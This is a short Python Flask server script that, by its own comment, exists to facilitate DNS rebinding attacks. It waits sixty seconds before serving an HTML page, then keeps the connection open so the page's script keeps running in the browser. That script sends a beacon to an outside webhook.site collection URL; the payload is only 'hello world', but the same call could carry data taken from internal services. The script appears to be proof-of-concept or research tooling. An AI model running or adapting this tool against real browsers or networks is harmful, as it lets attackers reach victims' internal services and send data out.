from flask import Flask, Response
import time

app = Flask(__name__)

# The goal of this is to facilitate DNS rebinding attacks by delaying, then sending content
# The keeping connection is also kept open on a timer so scripts will still run before browser closes.
@app.route('/')
def main():
    def generate():
        content = '''
        <html>
            <body>
                <script>
                    navigator.sendBeacon('https://webhook.site/429ce42f-731f-4b6b-8d52-c71836afbc2d', 'hello world');
                </script>
            </body>
        </html>
        '''
        time.sleep(60)
        yield content
        time.sleep(10)
    return Response(generate(), mimetype='text/html')

if __name__ == '__main__':
    app.run('0.0.0.0', 8080)
